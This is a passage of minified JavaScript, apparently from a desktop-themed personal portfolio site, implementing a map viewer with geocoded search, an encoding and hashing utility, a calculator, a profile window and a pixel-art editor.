            `;const k=l.querySelector("#toggle-address"),b=l.querySelector("#toggle-coords");return L.DomEvent.on(k,"click",x=>{L.DomEvent.stopPropagation(x),this.toggleMode("address")}),L.DomEvent.on(b,"click",x=>{L.DomEvent.stopPropagation(x),this.toggleMode("coords")}),L.DomEvent.disableClickPropagation(l),setTimeout(()=>{window.lucide&&lucide.createIcons({nodes:l.querySelectorAll("[data-lucide]")})},100),l},toggleMode:function(h){this._mode===h?this.setMode(null):this.setMode(h)},setMode:function(h){this._mode=h;const l=this._container.querySelector("#toggle-address"),k=this._container.querySelector("#toggle-coords"),b=this._map.getContainer(),x=b.querySelector(".leaflet-control-geosearch"),y=b.querySelector(".leaflet-control-latlon-search");l?.classList.remove("active"),k?.classList.remove("active"),[x,y].forEach(S=>{S&&(S.classList.remove("map-search-visible"),S.classList.add("map-search-hidden"))}),h==="address"&&x?(l?.classList.add("active"),x.classList.remove("map-search-hidden"),x.classList.add("map-search-visible")):h==="coords"&&y&&(k?.classList.add("active"),y.classList.remove("map-search-hidden"),y.classList.add("map-search-visible"))}}),e.querySelector("#map-container.leaflet-container"))return;e.querySelector(".window-content").innerHTML='<div id="map-container" class="h-full w-full"></div>';const s=e.querySelector("#map-container"),i=L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",{subdomains:"abcd",maxZoom:20}),p=L.tileLayer("https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",{}),u=L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",{}),a=L.tileLayer("https://{s}.tile.opentopomap.org/{z}/{x}/{y}.png",{}),n=new ResizeObserver(()=>{setTimeout(()=>g.invalidateSize(),t.RESIZE_DEBOUNCE)});n.observe(e.querySelector(".window-content")),e.resizeObserver=n;const g=L.map(s,{center:[20,0],zoom:2,minZoom:2,layers:[i],attributionControl:!1,zoomControl:!1});L.control.zoom({position:"bottomleft"}).addTo(g);const c={Default:i,Satellite:p,Street:u,Topographic:a};new L.Control.SelectLayers({baseLayers:c},{position:"topright"}).addTo(g),new L.Control.Coordinates({position:"bottomright"}).addTo(g);let d=null;const v=L.icon({iconUrl:'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32" height="32"><path fill="%23FFFFFF" stroke="%23000000" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/><path d="M0 0h24v24H0z" fill="none"/></svg>',iconSize:[32,32],iconAnchor:[16,32],popupAnchor:[0,-32]}),m=(h,l)=>{d&&g.removeLayer(d),d=L.marker(h,{icon:v}).addTo(g),l&&d.bindPopup(l).openPopup()},f=async h=>{const l=h.wrap(),k=l.lat,b=l.lng,x=`<b>Coordinates:</b><br>${k.toFixed(5)}, ${b.toFixed(5)}`;if(m(l,`<b>Locating...</b><br>${k.toFixed(5)}, ${b.toFixed(5)}`),!r.OPENCAGE.KEY||r.OPENCAGE.KEY==="YOUR_OPENCAGE_API_KEY"){m(l,x);return}try{const S=await(await fetch(`${r.OPENCAGE.BASE_URL}?q=${k}+${b}&key=${r.OPENCAGE.KEY}`)).json();S.results&&S.results.length>0?m(l,`<b>${S.results[0].formatted}</b>`):m(l,x)}catch(y){console.error("Reverse geocoding failed:",y),m(l,x)}};L.Control.MapSearchPanel=L.Control.extend({onAdd:function(h){this._map=h,this._mode=null,this._provider=new window.GeoSearch.OpenStreetMapProvider;const l=L.DomUtil.create("div","map-search-panel");l.innerHTML=`
                <div class="map-search-tabs">
                    <div class="map-search-tab" data-mode="address" title="Search by Address">
                        <i data-lucide="search"></i>
                    </div>
                    <div class="map-search-tab" data-mode="coords" title="Search by Coordinates">
                        <i data-lucide="compass"></i>
                    </div>
                </div>
                <div class="map-search-content" id="search-address">
                    <div class="map-search-address">
                        <input type="text" id="address-input" placeholder="Enter location or address..." />
                        <button class="map-search-btn" id="address-search-btn" title="Search">
                            <i data-lucide="search"></i>
                        </button>
                    </div>
                </div>
                <div class="map-search-content" id="search-coords">
                    <div class="map-search-coords">
                        <div class="map-coord-input-group">
                            <label>Latitude</label>
                            <input type="text" id="coord-lat" placeholder="e.g. 28.6139" />
                        </div>
                        <div class="map-coord-input-group">
                            <label>Longitude</label>
                            <input type="text" id="coord-lon" placeholder="e.g. 77.2090" />
                        </div>
                        <button class="map-search-btn" id="coords-search-btn" title="Go">
                            <i data-lucide="map-pin"></i>
                        </button>
                    </div>
                </div>
                <div class="map-search-results" id="search-results"></div>
            `;const k=l.querySelectorAll(".map-search-tab"),b=l.querySelector("#search-address"),x=l.querySelector("#search-coords"),y=l.querySelector("#search-results"),S=l.querySelector("#address-input");k.forEach(M=>{L.DomEvent.on(M,"click",A=>{L.DomEvent.stopPropagation(A);const H=M.dataset.mode;this._mode===H?(this._mode=null,k.forEach(B=>B.classList.remove("active")),b.classList.remove("active"),x.classList.remove("active")):(this._mode=H,k.forEach(B=>B.classList.remove("active")),M.classList.add("active"),b.classList.remove("active"),x.classList.remove("active"),H==="address"?(b.classList.add("active"),setTimeout(()=>S.focus(),100)):(x.classList.add("active"),setTimeout(()=>l.querySelector("#coord-lat").focus(),100)))})});const T=async()=>{const M=S.value.trim();if(M)try{const A=await this._provider.search({query:M});y.innerHTML="",A.length>0?(A.slice(0,6).forEach(H=>{const B=document.createElement("div");B.className="map-search-result-item",B.textContent=H.label,B.addEventListener("click",()=>{const O=L.latLng(H.y,H.x);h.setView(O,13,{animate:!0}),f(O),y.classList.remove("active"),S.value=H.label}),y.appendChild(B)}),y.classList.add("active")):y.classList.remove("active")}catch(A){console.error("Search error:",A)}};L.DomEvent.on(l.querySelector("#address-search-btn"),"click",M=>{L.DomEvent.stopPropagation(M),T()}),L.DomEvent.on(S,"keydown",M=>{M.key==="Enter"&&T(),M.key==="Escape"&&(S.value="",y.classList.remove("active"))});const w=()=>{const M=parseFloat(l.querySelector("#coord-lat").value.trim()),A=parseFloat(l.querySelector("#coord-lon").value.trim());if(!isNaN(M)&&!isNaN(A)&&M>=-90&&M<=90&&A>=-180&&A<=180){const H=L.latLng(M,A);h.setView(H,13,{animate:!0}),f(H)}else alert(`Invalid coordinates.
Latitude: -90 to 90
Longitude: -180 to 180`)};L.DomEvent.on(l.querySelector("#coords-search-btn"),"click",M=>{L.DomEvent.stopPropagation(M),w()});const D=l.querySelector("#coord-lat"),I=l.querySelector("#coord-lon");return L.DomEvent.on(D,"keydown",M=>{M.key==="Enter"&&w()}),L.DomEvent.on(I,"keydown",M=>{M.key==="Enter"&&w()}),L.DomEvent.on(h.getContainer(),"click",()=>{y.classList.remove("active")}),L.DomEvent.disableClickPropagation(l),L.DomEvent.disableScrollPropagation(l),setTimeout(()=>{window.lucide&&lucide.createIcons({nodes:l.querySelectorAll("[data-lucide]")})},50),l}}),new L.Control.MapSearchPanel({position:"topleft"}).addTo(g),g.on("click",h=>f(h.latlng))}function le(e){e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full">
                  <!-- Main Content Area -->
                  <div class="flex-grow flex p-2 space-x-2">
                      <!-- Input Area -->
                      <div class="flex flex-col w-1/2">
                          <label class="text-xs mb-1" style="color: var(--text-color-dim);">INPUT DATA:</label>
                          <textarea id="crypto-input" class="h-full p-2 bg-black text-sm overflow-y-auto whitespace-pre-wrap w-full resize-none focus:outline-none focus:ring-1" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                              placeholder="Enter data to encode, decode, or hash..."></textarea>
                      </div>
                      <!-- Output Area -->
                      <div class="flex flex-col w-1/2">
                          <label class="text-xs mb-1" style="color: var(--text-color-dim);">OUTPUT DATA:</label>
                          <textarea id="crypto-output" class="h-full p-2 bg-black text-sm overflow-y-auto whitespace-pre-wrap w-full resize-none focus:outline-none focus:ring-1" style="color: var(--accent-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);"
                              readonly></textarea>
                      </div>
                  </div>
                  <!-- Controls Area -->
                  <div class="flex space-x-2 p-2 flex-shrink-0 justify-center" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                      <select id="crypto-operation" class="text-sm p-1 rounded-none" style="background-color: var(--primary-color-dark); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                          <option value="b64e">Base64 Encode</option>
                          <option value="b64d">Base64 Decode</option>
                          <option value="hexe">Hex Encode</option>
                          <option value="hexd">Hex Decode</option>
                          <option value="rot13">ROT13 Cipher</option>
                          <option value="rot47">ROT47 Cipher</option>
                          <option value="md5">Hash (MD5 Sim)</option>
                          <option value="sha256">Hash (SHA-256 Sim)</option>
                          <option value="qrcode">Generate QR Code</option>
                      </select>
                      <button id="crypto-run-btn" class="text-black font-bold py-2 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">Execute Operation</button>
                  </div>
              </div>
          `;const o=e.querySelector("#crypto-input"),r=e.querySelector("#crypto-output"),t=e.querySelector("#crypto-operation"),s=e.querySelector("#crypto-run-btn"),i=d=>d.replace(/[a-zA-Z]/g,v=>String.fromCharCode(v.charCodeAt(0)+(v.toLowerCase()<="m"?13:-13))),p=d=>d.replace(/[\u0021-\u007E]/g,v=>String.fromCharCode((v.charCodeAt(0)-33+47)%94+33)),u=d=>{let v="";for(let m=0;m<d.length;m++)v+=d.charCodeAt(m).toString(16).padStart(2,"0");return v},a=d=>{const v=d.replace(/[^0-9A-Fa-f]/g,"");if(v.length%2!==0)throw new Error("Invalid hex string length");let m="";for(let f=0;f<v.length;f+=2){const h=v.substr(f,2);m+=String.fromCharCode(parseInt(h,16))}return m},n=d=>{const v=[],m=[1732584193,4023233417,2562383102,271733878];for(let b=0;b<64;b++)v[b]=Math.floor(Math.abs(Math.sin(b+1))*4294967296);let f=unescape(encodeURIComponent(d)),h=[];for(let b=0;b<f.length;b++)h.push(f.charCodeAt(b));for(h.push(128);h.length%64!==56;)h.push(0);let l=f.length*8;for(let b=0;b<8;b++)h.push(l>>>b*8&255);const k=[7,12,17,22,5,9,14,20,4,11,16,23,6,10,15,21];for(let b=0;b<h.length;b+=64){let x=m.slice(0);for(let y=0;y<64;y++){let S,T;y<16?(S=x[1]&x[2]|~x[1]&x[3],T=y):y<32?(S=x[3]&x[1]|~x[3]&x[2],T=(5*y+1)%16):y<48?(S=x[1]^x[2]^x[3],T=(3*y+5)%16):(S=x[2]^(x[1]|~x[3]),T=7*y%16);const w=h[b+T*4]|h[b+T*4+1]<<8|h[b+T*4+2]<<16|h[b+T*4+3]<<24,D=k[Math.floor(y/16)*4+y%4],I=x[0]+S+v[y]+w>>>0,M=x[1]+(I<<D|I>>>32-D)>>>0;x[0]=x[3],x[3]=x[2],x[2]=x[1],x[1]=M}for(let y=0;y<4;y++)m[y]=m[y]+x[y]>>>0}return m.map(b=>{let x="";for(let y=0;y<4;y++)x+=(b>>>y*8&255).toString(16).padStart(2,"0");return x}).join("")},g=d=>`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(d)}`,c=async()=>{const d=o.value,v=t.value;let m="";try{switch(v){case"b64e":m=btoa(d);break;case"b64d":m=atob(d);break;case"hexe":m=u(d);break;case"hexd":m=a(d);break;case"rot13":m=i(d);break;case"rot47":m=p(d);break;case"md5":m=n(d);break;case"sha256":const f=new TextEncoder().encode(d),h=await crypto.subtle.digest("SHA-256",f);m=Array.from(new Uint8Array(h)).map(l=>l.toString(16).padStart(2,"0")).join("");break;case"qrcode":m=g(d);break;default:m="ERROR: Unknown Operation."}}catch(f){m="ERROR: Data format invalid for decoding or processing failed.",console.error(f)}if(v==="qrcode"){const f=document.createElement("div");f.style.display="flex",f.style.justifyContent="center",f.style.alignItems="center",f.style.height="100%",f.style.width="100%";const h=document.createElement("img");h.src=m,h.alt="QR Code",h.style.maxWidth="100%",h.style.maxHeight="100%",f.appendChild(h),r.parentNode.replaceChild(f,r),r._qrContainer=f}else{if(r._qrContainer){const f=r._qrContainer.parentNode;f&&f.replaceChild(r,r._qrContainer),r._qrContainer=null}r.value=m,r.style.backgroundColor="black",r.style.color="var(--accent-color)"}};s.addEventListener("click",c)}function ce(e){e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full bg-black p-4">
                  <div id="calc-expression" class="text-right text-sm p-1 mb-1" style="color: var(--text-color-dim); min-height: 20px;"></div>
                  <div id="calc-display" class="text-right text-2xl p-2 mb-4 bg-gray-800 rounded" style="color: var(--primary-color); min-height: 50px;">0</div>
                  <div class="grid grid-cols-4 gap-2 flex-grow">
                      <button class="calc-btn">7</button>
                      <button class="calc-btn">8</button>
                      <button class="calc-btn">9</button>
                      <button class="calc-btn calc-op">+</button>
                      <button class="calc-btn">4</button>
                      <button class="calc-btn">5</button>
                      <button class="calc-btn">6</button>
                      <button class="calc-btn calc-op">-</button>
                      <button class="calc-btn">1</button>
                      <button class="calc-btn">2</button>
                      <button class="calc-btn">3</button>
                      <button class="calc-btn calc-op">*</button>
                      <button class="calc-btn">0</button>
                      <button class="calc-btn">.</button>
                      <button class="calc-btn calc-eq">=</button>
                      <button class="calc-btn calc-op">/</button>
                      <button class="calc-btn calc-clear col-span-2">C</button>
                      <button class="calc-btn calc-back">⌫</button>
                  </div>
              </div>
          `;const o=document.createElement("style");o.innerHTML=`
              .calc-btn {
                  background-color: var(--primary-color-dark);
                  color: var(--text-color-dim);
                  border: 1px solid var(--primary-color-dark);
                  padding: 10px;
                  font-size: 18px;
                  cursor: pointer;
                  transition: background-color 0.2s;
              }
              .calc-btn:hover {
                  background-color: var(--primary-color);
                  color: black;
              }
              .calc-op {
                  background-color: #90EE90;
                  color: black;
              }
              .calc-eq {
                  background-color: var(--danger-color);
                  color: white;
              }
              .calc-clear {
                  background-color: var(--danger-color);
                  color: white;
              }
          `,e.appendChild(o);const r=e.querySelector("#calc-display"),t=e.querySelector("#calc-expression");let s="0",i=null,p=null,u=!1,a="";function n(){r.textContent=s,t.textContent=a}function g(f){u?(s=f,a+=" "+f,u=!1):(s=s==="0"?f:s+f,a&&!a.includes("=")&&(a+=f)),n()}function c(){u?(s="0.",a+=" 0.",u=!1):s.indexOf(".")===-1&&(s+=".",a&&!a.includes("=")&&(a+=".")),n()}function d(){s="0",i=null,p=null,u=!1,a="",n()}function v(f){const h=parseFloat(s);if(p===null)p=h;else if(i){const l=m(p,h,i);s=String(l),p=l}u=!0,i=f,a=s+" "+f,n()}function m(f,h,l){switch(l){case"+":return f+h;case"-":return f-h;case"*":return f*h;case"/":return f/h;default:return h}}e.addEventListener("click",f=>{if(f.target.classList.contains("calc-btn")){const h=f.target.textContent;if(h>="0"&&h<="9")g(h);else if(h===".")c();else if(h==="C")d();else if(h==="⌫")s.length>1?s=s.slice(0,-1):s="0",n();else if(["+","-","*","/"].includes(h))v(h);else if(h==="="&&i&&p!==null){const l=m(p,parseFloat(s),i);a+=" =",s=String(l),i=null,p=null,u=!0,n()}}})}async function de(e,o){e.querySelector(".window-content").innerHTML=`
               <div class="p-4 text-center" style="color: var(--text-color-dim);">Loading content...</div>
           `;let r;try{const n=await fetch("/content.json");if(!n.ok)throw new Error(`HTTP error! status: ${n.status}`);r=await n.json()}catch(n){console.error("Failed to load content.json:",n),e.querySelector(".window-content").innerHTML=`
                   <div class="p-4 text-center" style="color: var(--danger-color);">Error: Unable to load content. Please check the console for details.</div>
               `;return}const t=n=>{let g="";return n.core&&(g+=`
                       <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                           <h4 class="font-bold mb-3" style="color: var(--text-color-dim);">Core Competencies</h4>
                           <ul class="list-disc list-inside space-y-2">
                               ${n.core.map(c=>`<li>${c}</li>`).join("")}
                           </ul>
                       </div>
                   `),(n.tech||n.creative)&&(g+=`
                       <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                           <div class="flex justify-between items-center mb-4">
                               <h4 class="font-bold" style="color: var(--text-color-dim);">Tools & Tech Stacks</h4>
                               <div id="skill-toggle-btns" class="flex text-xs border rounded-md" style="border-color: var(--primary-color-dark);">
                                   ${n.tech?'<button class="skill-toggle-btn active px-3 py-1" data-grid="tech-skills-grid">Tech</button>':""}
                                   ${n.creative?`<button class="skill-toggle-btn ${n.tech?"":"active"} px-3 py-1" data-grid="creative-skills-grid">Creative</button>`:""}
                               </div>
                           </div>
                           ${n.tech?`
                               <div id="tech-skills-grid" class="skills-grid grid grid-cols-3 sm:grid-cols-4 gap-2 text-center">
                                   ${n.tech.map(c=>`<div class="skill-item p-3 flex flex-col items-center justify-center aspect-square" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="${c.logo}" alt="${c.name}" class="h-10 w-10"><span class="block text-xs mt-1">${c.name}</span></div>`).join("")}
                               </div>
                           `:""}
                           ${n.creative?`
                               <div id="creative-skills-grid" class="skills-grid ${n.tech?"hidden":""} grid grid-cols-3 sm:grid-cols-4 gap-2 text-center">
                                   ${n.creative.map(c=>`<div class="skill-item p-3 flex flex-col items-center justify-center aspect-square" style="background-color: #000; border: 1px solid var(--primary-color-dark);"><img src="${c.logo}" alt="${c.name}" class="h-10 w-10"><span class="block text-xs mt-1">${c.name}</span></div>`).join("")}
                               </div>
                           `:""}
                       </div>
                   `),g},s=n=>n.map(g=>`
                   <div class="p-4 flex justify-between items-center" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);">
                       <div>
                           <h4 class="font-bold" style="color: var(--text-color-dim);">${g.title}</h4>
                           <p class="text-xs opacity-70">${g.description}</p>
                       </div>
                       <button class="blog-link text-xs px-3 py-1" data-url="${g.url}">View</button>
                   </div>
               `).join("");e.querySelector(".window-content").innerHTML=`
               <div class="flex h-full text-sm">
                   <!-- Left Sidebar -->
                   <div class="w-1/3 flex-shrink-0 flex flex-col p-4 space-y-4" style="background-color: var(--primary-color-darker);">
                       <!-- Profile Header -->
                       <div class="text-center">
                           <div class="w-24 h-24 mx-auto mb-3 flex items-center justify-center rounded-full" style="border: 3px solid var(--primary-color); background-color: #000;">
                               <img src="${r.logo||"assets/me.png"}" alt="${r.name||"DevDebug"} Avatar" class="w-24 h-24 rounded-full">
                           </div>
                           <h2 class="text-xl font-bold">${r.name||"DevDebug"}</h2>
                           <p class="text-xs" style="color: var(--text-color-dim);">Cybersecurity / UX Research</p>
                       </div>

                       <!-- Vertical Tab Navigation -->
                       <div id="devdebug-tabs" class="flex-grow flex flex-col space-y-1">
                           <button class="devdebug-tab-btn active" data-tab="about"><i data-lucide="user-round" class="w-4 h-4 mr-2"></i><span>About</span></button>
                           ${r.skills?'<button class="devdebug-tab-btn" data-tab="skills"><i data-lucide="wrench" class="w-4 h-4 mr-2"></i><span>Skills</span></button>':""}
                           ${r.blog?'<button class="devdebug-tab-btn" data-tab="blog"><i data-lucide="rss" class="w-4 h-4 mr-2"></i><span>Blog</span></button>':""}
                           <button class="devdebug-tab-btn" data-tab="contact"><i data-lucide="mail" class="w-4 h-4 mr-2"></i><span>Contact</span></button>
                       </div>
                   </div>

                   <!-- Right Content Panel -->
                   <div class="w-2/3 flex-grow p-6 overflow-y-auto" style="color: var(--text-color-dim); border-left: 1px solid var(--primary-color-dark);">
                       <div id="devdebug-tab-about" class="devdebug-tab-content space-y-4">
                           <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ About Me ]</h3>
                           <div class="p-4 space-y-3" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                               <p class="leading-relaxed">${r.about||"No about section available."}</p>
                           </div>
                       </div>
                       ${r.skills?`
                           <div id="devdebug-tab-skills" class="devdebug-tab-content hidden space-y-4" style="opacity: 0;">
                               <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Skillset ]</h3>
                               ${t(r.skills)}
                           </div>
                       `:""}
                       ${r.blog?`
                           <div id="devdebug-tab-blog" class="devdebug-tab-content hidden space-y-4" style="opacity: 0;">
                               <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Blogs ]</h3>
                               ${s(r.blog)}
                           </div>
                       `:""}
                       <div id="devdebug-tab-contact" class="devdebug-tab-content hidden space-y-4" style="opacity: 0;">
                           <h3 class="font-bold text-xl mb-3" style="color: var(--primary-color);">[ Contact Me ]</h3>
                           <div class="p-4" style="background-color: var(--primary-color-darker); border-left: 3px solid var(--primary-color);">
                               <p class="leading-relaxed mb-3">For encrypted communications, use the following channel. Public keys available upon authenticated request.</p>
                               <a href="mailto:${r.contact||"contact@devdebug.in"}" class="font-mono p-2 inline-block" style="color: var(--accent-color); background-color: #000;">${r.contact||"contact@devdebug.in"}</a>
                           </div>
                       </div>
                   </div>
               </div>
           `;const i=e.querySelectorAll(".devdebug-tab-btn"),p=e.querySelectorAll(".devdebug-tab-content");i.forEach(n=>{n.addEventListener("click",()=>{i.forEach(c=>c.classList.remove("active")),n.classList.add("active"),p.forEach(c=>{c.classList.add("hidden"),c.style.opacity="0"});const g=e.querySelector(`#devdebug-tab-${n.dataset.tab}`);g.classList.remove("hidden"),setTimeout(()=>g.style.opacity="1",10)})});const u=e.querySelector("#skill-toggle-btns");if(u){const n=u.querySelectorAll(".skill-toggle-btn"),g=e.querySelectorAll(".skills-grid");n.forEach(c=>{c.addEventListener("click",()=>{n.forEach(d=>d.classList.remove("active")),c.classList.add("active"),g.forEach(d=>d.classList.add("hidden")),e.querySelector(`#${c.dataset.grid}`).classList.remove("hidden")})})}lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")}),e.querySelectorAll(".blog-link").forEach(n=>{n.addEventListener("click",g=>{g.preventDefault();const c=g.target.dataset.url,{openApp:d,WindowManager:v,focusWindow:m,navigateOrSearch:f}=o;typeof d=="function"&&(d("browser"),setTimeout(()=>{const h=v.openWindows.browser;h&&(h.querySelector("#browser-url").value=c,typeof f=="function"&&f(h,c,!1),typeof m=="function"&&m(h))},100))})});const a=document.createElement("style");a.innerHTML=`
              .devdebug-tab-btn { display: flex; align-items: center; space-x: 3; width: 100%; text-align: left; padding: 0.75rem 1rem; border-radius: 0.25rem; transition: background-color 0.2s, color 0.2s, border-left-color 0.2s; border-left: 3px solid transparent; }
              .devdebug-tab-btn:hover { background-color: rgba(255,255,255,0.05); }
              .devdebug-tab-btn.active { background-color: var(--primary-color-dark); color: var(--primary-color); font-weight: bold; border-left-color: var(--primary-color); }
              .devdebug-tab-content { transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out; }
              .blog-link { background-color: var(--primary-color); color: black; font-weight: bold; transition: opacity 0.2s; }
              .blog-link:hover { opacity: 0.8; }
              .skill-toggle-btn { transition: background-color 0.2s; }
              .skill-toggle-btn.active { background-color: var(--primary-color); color: black; font-weight: bold; }
              .skill-item { border-radius: 0.25rem; transition: transform 0.2s ease-in-out, border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out, background-color 0.2s ease-in-out; }
              .skill-item:hover {
                  transform: scale(1.05);
                  border-color: var(--primary-color);
                  box-shadow: 0 0 10px var(--primary-color-glow);
                  background-color: rgba(0, 255, 65, 0.1);
              }
          `,e.appendChild(a)}function ue(e){e.querySelector(".window-content").innerHTML=`
        <div class="flex flex-col h-full bg-black">
            <!-- Top Action Bar -->
            <div class="flex items-center justify-between p-2 border-b border-gray-800" style="background-color: var(--primary-color-darker);">
                <div class="flex space-x-2">
                    <button id="pixelr-undo" title="Undo" class="pixelr-action-btn p-1.5"><i data-lucide="undo" class="w-4 h-4 pointer-events-none"></i></button>
                    <button id="pixelr-redo" title="Redo" class="pixelr-action-btn p-1.5"><i data-lucide="redo" class="w-4 h-4 pointer-events-none"></i></button>
                </div>
                <div class="flex space-x-2">
                    <button id="pixelr-export" title="Export PNG" class="pixelr-action-btn p-1.5 bg-green-900/30 text-green-400 border border-green-500/30 flex items-center justify-center"><i data-lucide="download" class="w-4 h-4 mr-1 pointer-events-none"></i><span class="text-xs font-bold pointer-events-none">SAVE</span></button>
                </div>
            </div>

            <div class="flex flex-grow overflow-hidden">
                <!-- Toolbar (Side) -->
                <div class="w-16 flex-shrink-0 p-2 flex flex-col space-y-6 overflow-y-auto" style="background-color: var(--primary-color-darker); border-right: 1px solid var(--primary-color-dark);">
                    <!-- Tools Section -->
                    <div>
                        <div class="grid grid-cols-1 gap-3">
                            <button id="tool-pencil" title="Pencil" class="pixelr-tool active p-2.5 flex items-center justify-center rounded-md cursor-pointer"><i data-lucide="pencil" class="w-5 h-5 pointer-events-none"></i></button>
                            <button id="tool-bucket" title="Flood Fill" class="pixelr-tool p-2.5 flex items-center justify-center rounded-md cursor-pointer"><i data-lucide="paint-bucket" class="w-5 h-5 pointer-events-none"></i></button>
                            <button id="tool-eraser" title="Eraser" class="pixelr-tool p-2.5 flex items-center justify-center rounded-md cursor-pointer"><i data-lucide="eraser" class="w-5 h-5 pointer-events-none"></i></button>
                            <button id="pixelr-clear" title="Clear Canvas" class="pixelr-action-btn p-2.5 text-orange-500 flex items-center justify-center border border-dashed border-orange-900/50 hover:border-orange-500/50 rounded-md"><i data-lucide="trash-2" class="w-5 h-5 pointer-events-none"></i></button>
                        </div>
                    </div>
                    
                    <!-- Color Section -->
                    <div class="flex flex-col items-center">
                        <div id="color-palette" class="grid grid-cols-2 gap-2 mb-4">
                            <!-- Color swatches injected here -->
                        </div>
                        <div class="relative group">
                            <input type="color" id="pixelr-custom-color" class="w-10 h-10 border-none bg-transparent cursor-pointer rounded-full overflow-hidden" title="Custom Color">
                        </div>
                    </div>
                </div>

                <!-- Canvas Area -->
                <div id="pixelr-canvas-container" class="flex-grow flex items-center justify-center p-4 overflow-auto relative bg-[#050905]">
                    <div class="relative shadow-2xl" id="canvas-wrapper">
                         <canvas id="pixelr-canvas" class="cursor-crosshair"></canvas>
                         <canvas id="pixelr-grid-canvas" class="absolute top-0 left-0 pointer-events-none opacity-20"></canvas>
                    </div>
                </div>
            </div>
        </div>
    `;const o=e.querySelector("#pixelr-canvas"),r=e.querySelector("#pixelr-grid-canvas"),t=o.getContext("2d",{willReadFrequently:!0}),s=r.getContext("2d"),i=e.querySelector("#color-palette"),p=e.querySelector("#pixelr-custom-color"),u=32,a=15,n=u*a;o.width=r.width=n,o.height=r.height=n;let g=!1,c="#00FF41",d="pencil",v=[],m=-1;["#FFFFFF","#000000","#FF4500","#00FF41","#00FFFF","#FF00FF","#FFFF00","#1E90FF"].forEach((w,D)=>{const I=document.createElement("div");I.className="color-swatch-modern p-0.5 rounded-sm cursor-pointer border-2 border-transparent hover:border-white transition-all",I.style.width="20px",I.style.height="20px",I.style.backgroundColor=w,I.dataset.color=w,w===c&&I.classList.add("active-swatch"),i.appendChild(I)});function h(){s.clearRect(0,0,n,n),s.strokeStyle="rgba(255, 255, 255, 0.1)",s.lineWidth=.5;for(let w=0;w<=u;w++)s.beginPath(),s.moveTo(w*a,0),s.lineTo(w*a,n),s.stroke(),s.beginPath(),s.moveTo(0,w*a),s.lineTo(n,w*a),s.stroke()}function l(){const w=t.getImageData(0,0,n,n);m<v.length-1&&(v=v.slice(0,m+1)),v.push(w),v.length>50?v.shift():m++}function k(){m>0&&(m--,t.putImageData(v[m],0,0))}function b(){m<v.length-1&&(m++,t.putImageData(v[m],0,0))}function x(w){let D=parseInt(w.slice(1,3),16),I=parseInt(w.slice(3,5),16),M=parseInt(w.slice(5,7),16);return[D,I,M,255]}function y(w,D,I){const A=t.getImageData(0,0,n,n).data,H=(D*a*n+w*a)*4,B=A[H],O=A[H+1],E=A[H+2],C=A[H+3],_=x(I);if(B===_[0]&&O===_[1]&&E===_[2]&&C===_[3])return;const N=[[w,D]],R=new Uint8Array(u*u);for(t.fillStyle=I;N.length>0;){const[P,$]=N.pop();if(P<0||P>=u||$<0||$>=u||R[$*u+P])continue;R[$*u+P]=1;const U=($*a*n+P*a)*4;A[U]===B&&A[U+1]===O&&A[U+2]===E&&A[U+3]===C&&(t.fillRect(P*a,$*a,a,a),N.push([P+1,$],[P-1,$],[P,$+1],[P,$-1]))}l()}function S(w){const D=o.getBoundingClientRect(),I=Math.floor((w.clientX-D.left)/a),M=Math.floor((w.clientY-D.top)/a);if(!(I<0||I>=u||M<0||M>=u)){if(d==="bucket"){y(I,M,c);return}(d==="pencil"||d==="eraser")&&(t.fillStyle=d==="pencil"?c:"rgba(0,0,0,0)",d==="eraser"?t.clearRect(I*a,M*a,a,a):t.fillRect(I*a,M*a,a,a))}}o.addEventListener("mousedown",w=>{d==="bucket"||(g=!0),S(w)}),e.addEventListener("mousemove",w=>{g&&S(w)});const T=()=>{g&&(g=!1,l())};document.addEventListener("mouseup",T),o.addEventListener("mouseleave",T),e.addEventListener("click",w=>{const D=w.target.closest(".pixelr-tool"),I=w.target.closest(".pixelr-action-btn"),M=w.target.closest(".color-swatch-modern");if(D&&(e.querySelectorAll(".pixelr-tool").forEach(A=>A.classList.remove("active")),D.classList.add("active"),d=D.id.split("-")[1]),I){const A=I.id.split("-")[1];if(A==="undo"&&k(),A==="redo"&&b(),A==="clear"&&(t.clearRect(0,0,n,n),l()),A==="export"){const H=document.createElement("a");H.download="pixel-art.png",H.href=o.toDataURL(),H.click()}}M&&(e.querySelectorAll(".color-swatch-modern").forEach(A=>A.classList.remove("active-swatch")),M.classList.add("active-swatch"),c=M.dataset.color,p.value=c)}),p.addEventListener("input",w=>{c=w.target.value,e.querySelectorAll(".color-swatch-modern").forEach(D=>D.classList.remove("active-swatch"))}),l(),h(),lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")}),e.cleanup=()=>{document.removeEventListener("mouseup",T)}}function 